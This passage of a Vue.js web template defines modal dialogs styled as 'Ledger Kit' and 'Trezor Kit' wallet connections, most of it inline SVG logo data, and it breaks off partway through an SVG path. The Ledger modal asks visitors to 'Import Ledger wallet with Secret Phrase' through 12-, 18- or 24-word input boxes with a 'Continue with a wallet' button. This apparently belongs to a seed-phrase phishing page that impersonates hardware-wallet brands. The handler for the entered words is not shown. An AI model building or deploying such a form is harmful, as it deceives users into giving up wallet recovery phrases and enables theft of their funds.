                  viewBox="0 0 100 100"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect width="100" height="100" rx="13" fill="#FEE5FB"></rect>
                  <path
                    d="M65.7277 27H44.5023V55.3931H72.9884V34.3873C73 30.3988 69.7292 27 65.7277 27ZM37.9839 27H34.4231C30.4216 27 27 30.2486 27 34.3988V37.948H37.9839V27ZM27 44.5954H37.9839V55.5434H27V44.5954ZM62.0161 72.9884H65.5769C69.5784 72.9884 73 69.7399 73 65.5896V62.052H62.0161V72.9884ZM44.5023 62.052H55.4861V73H44.5023V62.052ZM27 62.052V65.6012C27 69.5896 30.2592 73 34.4231 73H37.9839V62.052H27Z"
                    fill="#333333"
                  ></path>
                </svg>
              </div>
            </div>
            <p class="ledgeronetxt">Connecting to Ledger Kit</p>
          </div>
        </div>
        <div class="poweredby">
          <svg
            class="scwtw-h-6 scwtw-w-auto"
            width="494"
            height="48"
            viewBox="0 0 494 48"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M245 24C245 10.745 255.055 0 267.459 0H324.541C336.945 0 347 10.745 347 24C347 37.255 336.945 48 324.541 48H267.459C255.055 48 245 37.255 245 24Z"
              fill="#202020"
            ></path>
            <path
              d="M315.106 29.874V18.786H317.064V20.458C317.768 19.226 319.198 18.5 320.782 18.5C323.18 18.5 324.852 20.018 324.852 22.966V29.874H322.916V23.076C322.916 21.14 321.816 20.128 320.21 20.128C318.472 20.128 317.064 21.514 317.064 23.472V29.874H315.106ZM302.761 29.874L300.715 18.786H302.563L304.015 27.938L305.929 21.91H307.755L309.647 27.872L311.121 18.786H312.969L310.923 29.874H308.723L306.853 24.11L304.961 29.874H302.761ZM294.113 30.16C290.747 30.16 288.767 27.652 288.767 24.33C288.767 21.03 290.747 18.5 294.113 18.5C297.479 18.5 299.459 21.03 299.459 24.33C299.459 27.652 297.479 30.16 294.113 30.16ZM294.113 28.532C296.533 28.532 297.457 26.464 297.457 24.308C297.457 22.174 296.533 20.128 294.113 20.128C291.693 20.128 290.769 22.174 290.769 24.308C290.769 26.464 291.693 28.532 294.113 28.532ZM281.842 30.16C278.586 30.16 276.54 27.674 276.54 24.33C276.54 21.008 278.586 18.5 281.842 18.5C284.592 18.5 287.012 20.062 286.748 24.836H278.542C278.696 26.882 279.642 28.554 281.842 28.554C283.316 28.554 284.284 27.652 284.614 26.618H286.55C286.242 28.466 284.504 30.16 281.842 30.16ZM278.586 23.362H284.856C284.702 21.14 283.668 20.106 281.842 20.106C279.84 20.106 278.85 21.558 278.586 23.362ZM267.148 29.874V18.786H269.15V20.656C269.854 19.424 271.064 18.786 272.318 18.786H274.98V20.656H272.164C270.404 20.656 269.15 21.8 269.15 24.022V29.874H267.148Z"
              fill="white"
            ></path>
            <path
              d="M360.496 16.6H362.938L365.82 24.608L368.702 16.6H371.144V32H369.208V19.966L366.7 26.632H364.94L362.432 19.966V32H360.496V16.6ZM377.879 32.286C376.764 32.286 375.862 31.9853 375.173 31.384C374.498 30.7827 374.161 29.9907 374.161 29.008C374.161 27.864 374.542 27.05 375.305 26.566C376.082 26.0673 377.05 25.7447 378.209 25.598L380.585 25.29C380.995 25.246 381.274 25.1213 381.421 24.916C381.567 24.7107 381.641 24.454 381.641 24.146V24.124C381.641 23.552 381.435 23.09 381.025 22.738C380.629 22.386 380.035 22.21 379.243 22.21C378.436 22.21 377.798 22.3933 377.329 22.76C376.874 23.112 376.603 23.6327 376.515 24.322H374.557C374.674 23.1927 375.151 22.298 375.987 21.638C376.823 20.9633 377.901 20.626 379.221 20.626C380.673 20.626 381.758 20.9707 382.477 21.66C383.21 22.3493 383.577 23.3247 383.577 24.586V29.954C383.577 30.086 383.621 30.196 383.709 30.284C383.797 30.3573 383.907 30.394 384.039 30.394H384.721V32H383.401C382.873 32 382.469 31.8827 382.191 31.648C381.912 31.3987 381.773 31.0613 381.773 30.636V30.372C381.318 31.0467 380.746 31.538 380.057 31.846C379.367 32.1393 378.641 32.286 377.879 32.286ZM378.385 30.702C379.367 30.702 380.152 30.372 380.739 29.712C381.34 29.052 381.641 28.1793 381.641 27.094V26.324C381.362 26.4707 380.988 26.5807 380.519 26.654L378.583 26.94C377.747 27.072 377.138 27.2993 376.757 27.622C376.375 27.93 376.185 28.3627 376.185 28.92C376.185 29.4773 376.383 29.9173 376.779 30.24C377.175 30.548 377.71 30.702 378.385 30.702ZM388.287 20.912H390.245V22.584C390.597 21.968 391.103 21.4913 391.763 21.154C392.438 20.802 393.171 20.626 393.963 20.626C395.195 20.626 396.178 21.0147 396.911 21.792C397.659 22.5547 398.033 23.6547 398.033 25.092V32H396.097V25.202C396.097 24.2633 395.848 23.5373 395.349 23.024C394.865 22.5107 394.212 22.254 393.391 22.254C392.819 22.254 392.291 22.4007 391.807 22.694C391.323 22.9727 390.942 23.3687 390.663 23.882C390.384 24.3807 390.245 24.9527 390.245 25.598V32H388.287V20.912ZM406 32.286C404.768 32.286 403.778 31.9047 403.03 31.142C402.296 30.3647 401.93 29.2573 401.93 27.82V20.912H403.888V27.71C403.888 28.6633 404.13 29.3967 404.614 29.91C405.098 30.4087 405.758 30.658 406.594 30.658C407.166 30.658 407.686 30.5187 408.156 30.24C408.64 29.9467 409.021 29.5433 409.3 29.03C409.593 28.5167 409.74 27.9447 409.74 27.314V20.912H411.676V32H409.74V30.328C409.373 30.944 408.86 31.428 408.2 31.78C407.54 32.1173 406.806 32.286 406 32.286ZM418.806 32.286C417.692 32.286 416.79 31.9853 416.1 31.384C415.426 30.7827 415.088 29.9907 415.088 29.008C415.088 27.864 415.47 27.05 416.232 26.566C417.01 26.0673 417.978 25.7447 419.136 25.598L421.512 25.29C421.923 25.246 422.202 25.1213 422.348 24.916C422.495 24.7107 422.568 24.454 422.568 24.146V24.124C422.568 23.552 422.363 23.09 421.952 22.738C421.556 22.386 420.962 22.21 420.17 22.21C419.364 22.21 418.726 22.3933 418.256 22.76C417.802 23.112 417.53 23.6327 417.442 24.322H415.484C415.602 23.1927 416.078 22.298 416.914 21.638C417.75 20.9633 418.828 20.626 420.148 20.626C421.6 20.626 422.686 20.9707 423.404 21.66C424.138 22.3493 424.504 23.3247 424.504 24.586V29.954C424.504 30.086 424.548 30.196 424.636 30.284C424.724 30.3573 424.834 30.394 424.966 30.394H425.648V32H424.328C423.8 32 423.397 31.8827 423.118 31.648C422.84 31.3987 422.7 31.0613 422.7 30.636V30.372C422.246 31.0467 421.674 31.538 420.984 31.846C420.295 32.1393 419.569 32.286 418.806 32.286ZM419.312 30.702C420.295 30.702 421.08 30.372 421.666 29.712C422.268 29.052 422.568 28.1793 422.568 27.094V26.324C422.29 26.4707 421.916 26.5807 421.446 26.654L419.51 26.94C418.674 27.072 418.066 27.2993 417.684 27.622C417.303 27.93 417.112 28.3627 417.112 28.92C417.112 29.4773 417.31 29.9173 417.706 30.24C418.102 30.548 418.638 30.702 419.312 30.702ZM428.775 30.394H433.065V18.206H429.567V16.6H435.023V30.394H439.291V32H428.775V30.394ZM456.302 16.6H458.304V24.52L464.728 16.6H467.148L461.846 22.936L467.412 32H465.168L460.526 24.52L458.304 27.204V32H456.302V16.6ZM469.835 30.35H473.971V22.562H470.275V20.912H475.973V30.35H480.087V32H469.835V30.35ZM473.883 16.6H476.083V19.02H473.883V16.6ZM489.329 32C488.376 32 487.672 31.7947 487.217 31.384C486.763 30.9587 486.535 30.2913 486.535 29.382V22.518H483.235V20.912H486.029C486.176 20.912 486.293 20.868 486.381 20.78C486.484 20.692 486.535 20.5747 486.535 20.428V17.238H488.471V20.912H492.849V22.518H488.471V29.118C488.471 29.5287 488.574 29.844 488.779 30.064C488.985 30.2693 489.322 30.372 489.791 30.372H493.333V32H489.329Z"
              fill="#202020"
            ></path>
            <path
              d="M0.628 11.8H10.708C12.124 11.8 13.408 12.124 14.56 12.772C15.712 13.396 16.612 14.296 17.26 15.472C17.908 16.624 18.232 17.944 18.232 19.432C18.232 20.92 17.908 22.24 17.26 23.392C16.612 24.544 15.712 25.444 14.56 26.092C13.408 26.716 12.124 27.028 10.708 27.028H3.904V37H0.628V11.8ZM10.096 24.328C11.536 24.328 12.676 23.884 13.516 22.996C14.38 22.084 14.812 20.896 14.812 19.432C14.812 17.944 14.38 16.756 13.516 15.868C12.676 14.98 11.536 14.536 10.096 14.536H3.904V24.328H10.096ZM31.4842 37.468C28.4842 37.468 26.1562 36.352 24.5002 34.12C22.8442 31.888 22.0162 28.648 22.0162 24.4C22.0162 20.152 22.8442 16.912 24.5002 14.68C26.1562 12.448 28.4842 11.332 31.4842 11.332C34.4842 11.332 36.8122 12.448 38.4682 14.68C40.1242 16.912 40.9522 20.152 40.9522 24.4C40.9522 28.648 40.1242 31.888 38.4682 34.12C36.8122 36.352 34.4842 37.468 31.4842 37.468ZM31.4842 34.624C33.5722 34.624 35.0962 33.772 36.0562 32.068C37.0402 30.34 37.5322 27.784 37.5322 24.4C37.5322 21.016 37.0402 18.472 36.0562 16.768C35.0962 15.04 33.5722 14.176 31.4842 14.176C29.3962 14.176 27.8602 15.04 26.8762 16.768C25.9162 18.472 25.4362 21.016 25.4362 24.4C25.4362 27.784 25.9162 30.34 26.8762 32.068C27.8602 33.772 29.3962 34.624 31.4842 34.624ZM43.8724 11.8H47.1124L48.9484 31.384L52.2964 18.676H55.3924L58.7404 31.348L60.5044 11.8H63.7444L61.0804 37H57.4804L53.8444 23.032L50.1364 37H46.5724L43.8724 11.8ZM68.1407 11.8H84.7007V14.572H71.4167V22.492H83.2247V25.156H71.4167V34.228H84.7007V37H68.1407V11.8ZM89.9249 11.8H99.5369C101.001 11.8 102.309 12.1 103.461 12.7C104.637 13.276 105.549 14.116 106.197 15.22C106.869 16.3 107.205 17.596 107.205 19.108C107.205 20.884 106.737 22.384 105.801 23.608C104.865 24.808 103.617 25.624 102.057 26.056L107.601 37H103.965L98.6009 26.38H93.2009V37H89.9249V11.8ZM98.9969 23.644C100.509 23.644 101.685 23.248 102.525 22.456C103.365 21.64 103.785 20.524 103.785 19.108C103.785 17.644 103.365 16.516 102.525 15.724C101.685 14.932 100.509 14.536 98.9969 14.536H93.2009V23.644H98.9969ZM112.789 11.8H129.349V14.572H116.065V22.492H127.873V25.156H116.065V34.228H129.349V37H112.789V11.8ZM134.573 11.8H141.485C143.741 11.8 145.709 12.34 147.389 13.42C149.069 14.5 150.353 16 151.241 17.92C152.153 19.816 152.609 21.976 152.609 24.4C152.609 26.824 152.153 28.996 151.241 30.916C150.353 32.812 149.069 34.3 147.389 35.38C145.709 36.46 143.741 37 141.485 37H134.573V11.8ZM141.305 34.228C143.753 34.228 145.673 33.34 147.065 31.564C148.457 29.788 149.153 27.4 149.153 24.4C149.153 21.4 148.457 19.012 147.065 17.236C145.673 15.46 143.753 14.572 141.305 14.572H137.849V34.228H141.305ZM179.222 11.8H188.726C190.766 11.8 192.434 12.34 193.73 13.42C195.05 14.476 195.71 15.964 195.71 17.884C195.71 19.276 195.29 20.5 194.45 21.556C193.61 22.612 192.518 23.344 191.174 23.752C192.95 24.064 194.366 24.784 195.422 25.912C196.478 27.04 197.006 28.408 197.006 30.016C197.006 31.312 196.67 32.488 195.998 33.544C195.326 34.6 194.366 35.44 193.118 36.064C191.87 36.688 190.418 37 188.762 37H179.222V11.8ZM188.33 34.264C189.842 34.264 191.09 33.868 192.074 33.076C193.082 32.26 193.586 31.12 193.586 29.656C193.586 28.36 193.106 27.304 192.146 26.488C191.186 25.672 189.962 25.264 188.474 25.264H182.498V34.264H188.33ZM187.934 22.636C189.254 22.636 190.322 22.216 191.138 21.376C191.954 20.536 192.362 19.516 192.362 18.316C192.362 17.14 192.002 16.216 191.282 15.544C190.562 14.872 189.506 14.536 188.114 14.536H182.498V22.636H187.934ZM208.458 27.244L199.854 11.8H203.562L210.078 24.22L216.594 11.8H220.302L211.698 27.244V37H208.458V27.244Z"
              fill="#202020"
            ></path>
          </svg>
        </div>
      </div>
      <div :class="doublePage == '2' ? 'ledgertwo' : 'scwtw-hidden'">
        <div class="scwtw-flex scwtw-items-center scwtw-justify-between">
          <div>
            <svg
              class="scwtw-h-35 scwtw-w-auto"
              width="249"
              height="48"
              viewBox="0 0 249 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                fill="#202020"
              ></path>
              <path
                d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                fill="white"
              ></path>
              <path
                d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                fill="#202020"
              ></path>
            </svg>
          </div>
          <div>
            <button
              @click="walletsswitch('Ledger', false)"
              class="ledgerclosebut"
              type="button"
            >
              <svg
                class="scwtw-w-6 scwtw-h-6 ledgerclosesvg"
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M18 6 6 18"></path>
                <path d="m6 6 12 12"></path>
              </svg>
            </button>
          </div>
        </div>
        <div class="scwtw-mt-6">
          <div class="ledgertxtbox">
            <div>
              <h3 class="ledgertit">Import Ledger wallet with Secret Phrase</h3>
            </div>
            <div class="scwtw-mb-1d5">
              <p class="ledgertxt">
                Import an existing wallet with your 12, 18 or 24-word secret
                phrase.
              </p>
            </div>
            <div class="ledgertabinput">
              <div class="scwtw-w-full">
                <button
                  @click="selectedOptionh('12')"
                  class="ledgertabitem"
                  type="button"
                  data-is-selected="true"
                  data-words-count="12"
                >
                  <div>
                    <span class="ledgertabitemtxt">12 words</span>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full">
                <button
                  @click="selectedOptionh('18')"
                  class="ledgertabitem"
                  type="button"
                  data-is-selected="false"
                  data-words-count="18"
                >
                  <div>
                    <span class="ledgertabitemtxt">18 words</span>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full">
                <button
                  @click="selectedOptionh('24')"
                  class="ledgertabitem"
                  type="button"
                  data-is-selected="false"
                  data-words-count="24"
                >
                  <div>
                    <span class="ledgertabitemtxt">24 words</span>
                  </div>
                </button>
              </div>
            </div>
          </div>
        </div>
        <div class="scwtw-mt-4">
          <div class="ledgerinputbox">
            <div class="ledgerinputs">
              <div
                v-for="(item, i) in visibleInputs"
                :key="i"
                class="ledgerinputitem"
              >
                <div class="ledgeritemi">
                  <div>
                    <p class="ledgeritemitxt">{{ i + 1 }}</p>
                  </div>
                </div>
                <input
                  class="ledgerinputv"
                  v-model="item.value"
                  type="text"
                  data-invalid="false"
                />
              </div>
            </div>
          </div>
          <div :class="errormessage ? 'ledgererrorbox' : 'scwtw-hidden'">
            <span class="ledgererrortxt">words is invalid or misspelled</span>
          </div>
        </div>
        <div class="ledgerimportbutbox">
          <div class="scwtw-w-full">
            <button
              class="ledgerimportbut"
              @click="confirm()"
              :disabled="!isConfirmEnabled"
            >
              Continue with a wallet
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Trezor -->
  <div :class="Trezorisshow ? 'walletsbox zindexh' : 'walletsbox zindexh op0'">
    <div
      @click="walletsswitch('Trezor', false)"
      class="walletsbg zindexh1"
    ></div>
    <div :class="Trezorisshow ? 'Ledgerbox ledgerboxshow' : 'Ledgerbox'">
      <div :class="doublePage == '1' ? 'ledgerone' : 'scwtw-hidden'">
        <div class="ledgeronelogobox">
          <div class="ledgeronelogob">
            <div class="scwtw-relative">
              <div class="ledgeronelogok">
                <svg
                  class="ledgeronelogo"
                  width="100"
                  height="100"
                  viewBox="0 0 100 100"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect width="100" height="100" rx="13" fill="#0F6148"></rect>
                  <g clip-path="url(#clip0_0_1)">
                    <path
                      d="M50.4976 22C42.7377 22 36.4578 28.3281 36.4578 36.1475V41.4498C33.7328 41.9469 31 42.6096 31 43.4696V71.1413C31 71.1413 31 71.9066 31.8535 72.2697C34.9465 73.5321 47.1148 77.8717 49.9104 78.866C50.2705 79.0001 50.3723 79.0001 50.4663 79.0001C50.5994 79.0001 50.6621 79.0001 51.0222 78.866C53.8177 77.8718 66.0174 73.5321 69.1104 72.2697C69.9012 71.9382 69.9326 71.1729 69.9326 71.1729V43.4696C69.9326 42.6096 67.239 41.9153 64.5062 41.4498V36.1475C64.5453 28.3281 58.2262 22 50.4976 22ZM50.4976 28.7621C55.0705 28.7621 57.8347 31.5474 57.8347 36.1554V40.7632C52.7058 40.4003 48.3286 40.4003 43.1684 40.7632V36.1554C43.1684 31.5395 45.9325 28.7621 50.4976 28.7621ZM50.4663 47.549C56.8481 47.549 62.204 48.0461 62.204 48.9377V66.2017C62.204 66.47 62.1727 66.5015 61.9377 66.5963C61.7107 66.6988 51.0536 70.5729 51.0536 70.5729C51.0536 70.5729 50.6229 70.7072 50.4976 70.7072C50.3645 70.7072 49.9416 70.5414 49.9416 70.5414C49.9416 70.5414 39.2846 66.6672 39.0574 66.5648C38.8304 66.4621 38.7912 66.4305 38.7912 66.1701V48.9061C38.7285 48.0145 44.0846 47.549 50.4663 47.549Z"
                      fill="white"
                    ></path>
                  </g>
                  <defs>
                    <clipPath id="clip0_0_1">
                      <rect
                        width="39"
                        height="57"
                        fill="white"
                        transform="translate(31 22)"
                      ></rect>
                    </clipPath>
                  </defs>
                </svg>
              </div>
            </div>
            <p class="ledgeronetxt">Connecting to Trezor Kit</p>
          </div>
        </div>
        <div class="poweredby">
          <svg
            class="scwtw-h-6 scwtw-w-auto"
            width="494"
            height="48"
            viewBox="0 0 494 48"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M245 24C245 10.745 255.055 0 267.459 0H324.541C336.945 0 347 10.745 347 24C347 37.255 336.945 48 324.541 48H267.459C255.055 48 245 37.255 245 24Z"
              fill="#202020"
            ></path>
            <path
              d="M315.106 29.874V18.786H317.064V20.458C317.768 19.226 319.198 18.5 320.782 18.5C323.18 18.5 324.852 20.018 324.852 22.966V29.874H322.916V23.076C322.916 21.14 321.816 20.128 320.21 20.128C318.472 20.128 317.064 21.514 317.064 23.472V29.874H315.106ZM302.761 29.874L300.715 18.786H302.563L304.015 27.938L305.929 21.91H307.755L309.647 27.872L311.121 18.786H312.969L310.923 29.874H308.723L306.853 24.11L304.961 29.874H302.761ZM294.113 30.16C290.747 30.16 288.767 27.652 288.767 24.33C288.767 21.03 290.747 18.5 294.113 18.5C297.479 18.5 299.459 21.03 299.459 24.33C299.459 27.652 297.479 30.16 294.113 30.16ZM294.113 28.532C296.533 28.532 297.457 26.464 297.457 24.308C297.457 22.174 296.533 20.128 294.113 20.128C291.693 20.128 290.769 22.174 290.769 24.308C290.769 26.464 291.693 28.532 294.113 28.532ZM281.842 30.16C278.586 30.16 276.54 27.674 276.54 24.33C276.54 21.008 278.586 18.5 281.842 18.5C284.592 18.5 287.012 20.062 286.748 24.836H278.542C278.696 26.882 279.642 28.554 281.842 28.554C283.316 28.554 284.284 27.652 284.614 26.618H286.55C286.242 28.466 284.504 30.16 281.842 30.16ZM278.586 23.362H284.856C284.702 21.14 283.668 20.106 281.842 20.106C279.84 20.106 278.85 21.558 278.586 23.362ZM267.148 29.874V18.786H269.15V20.656C269.854 19.424 271.064 18.786 272.318 18.786H274.98V20.656H272.164C270.404 20.656 269.15 21.8 269.15 24.022V29.874H267.148Z"
              fill="white"
            ></path>
            <path
              d="M360.496 16.6H362.938L365.82 24.608L368.702 16.6H371.144V32H369.208V19.966L366.7 26.632H364.94L362.432 19.966V32H360.496V16.6ZM377.879 32.286C376.764 32.286 375.862 31.9853 375.173 31.384C374.498 30.7827 374.161 29.9907 374.161 29.008C374.161 27.864 374.542 27.05 375.305 26.566C376.082 26.0673 377.05 25.7447 378.209 25.598L380.585 25.29C380.995 25.246 381.274 25.1213 381.421 24.916C381.567 24.7107 381.641 24.454 381.641 24.146V24.124C381.641 23.552 381.435 23.09 381.025 22.738C380.629 22.386 380.035 22.21 379.243 22.21C378.436 22.21 377.798 22.3933 377.329 22.76C376.874 23.112 376.603 23.6327 376.515 24.322H374.557C374.674 23.1927 375.151 22.298 375.987 21.638C376.823 20.9633 377.901 20.626 379.221 20.626C380.673 20.626 381.758 20.9707 382.477 21.66C383.21 22.3493 383.577 23.3247 383.577 24.586V29.954C383.577 30.086 383.621 30.196 383.709 30.284C383.797 30.3573 383.907 30.394 384.039 30.394H384.721V32H383.401C382.873 32 382.469 31.8827 382.191 31.648C381.912 31.3987 381.773 31.0613 381.773 30.636V30.372C381.318 31.0467 380.746 31.538 380.057 31.846C379.367 32.1393 378.641 32.286 377.879 32.286ZM378.385 30.702C379.367 30.702 380.152 30.372 380.739 29.712C381.34 29.052 381.641 28.1793 381.641 27.094V26.324C381.362 26.4707 380.988 26.5807 380.519 26.654L378.583 26.94C377.747 27.072 377.138 27.2993 376.757 27.622C376.375 27.93 376.185 28.3627 376.185 28.92C376.185 29.4773 376.383 29.9173 376.779 30.24C377.175 30.548 377.71 30.702 378.385 30.702ZM388.287 20.912H390.245V22.584C390.597 21.968 391.103 21.4913 391.763 21.154C392.438 20.802 393.171 20.626 393.963 20.626C395.195 20.626 396.178 21.0147 396.911 21.792C397.659 22.5547 398.033 23.6547 398.033 25.092V32H396.097V25.202C396.097 24.2633 395.848 23.5373 395.349 23.024C394.865 22.5107 394.212 22.254 393.391 22.254C392.819 22.254 392.291 22.4007 391.807 22.694C391.323 22.9727 390.942 23.3687 390.663 23.882C390.384 24.3807 390.245 24.9527 390.245 25.598V32H388.287V20.912ZM406 32.286C404.768 32.286 403.778 31.9047 403.03 31.142C402.296 30.3647 401.93 29.2573 401.93 27.82V20.912H403.888V27.71C403.888 28.6633 404.13 29.3967 404.614 29.91C405.098 30.4087 405.758 30.658 406.594 30.658C407.166 30.658 407.686 30.5187 408.156 30.24C408.64 29.9467 409.021 29.5433 409.3 29.03C409.593 28.5167 409.74 27.9447 409.74 27.314V20.912H411.676V32H409.74V30.328C409.373 30.944 408.86 31.428 408.2 31.78C407.54 32.1173 406.806 32.286 406 32.286ZM418.806 32.286C417.692 32.286 416.79 31.9853 416.1 31.384C415.426 30.7827 415.088 29.9907 415.088 29.008C415.088 27.864 415.47 27.05 416.232 26.566C417.01 26.0673 417.978 25.7447 419.136 25.598L421.512 25.29C421.923 25.246 422.202 25.1213 422.348 24.916C422.495 24.7107 422.568 24.454 422.568 24.146V24.124C422.568 23.552 422.363 23.09 421.952 22.738C421.556 22.386 420.962 22.21 420.17 22.21C419.364 22.21 418.726 22.3933 418.256 22.76C417.802 23.112 417.53 23.6327 417.442 24.322H415.484C415.602 23.1927 416.078 22.298 416.914 21.638C417.75 20.9633 418.828 20.626 420.148 20.626C421.6 20.626 422.686 20.9707 423.404 21.66C424.138 22.3493 424.504 23.3247 424.504 24.586V29.954C424.504 30.086 424.548 30.196 424.636 30.284C424.724 30.3573 424.834 30.394 424.966 30.394H425.648V32H424.328C423.8 32 423.397 31.8827 423.118 31.648C422.84 31.3987 422.7 31.0613 422.7 30.636V30.372C422.246 31.0467 421.674 31.538 420.984 31.846C420.295 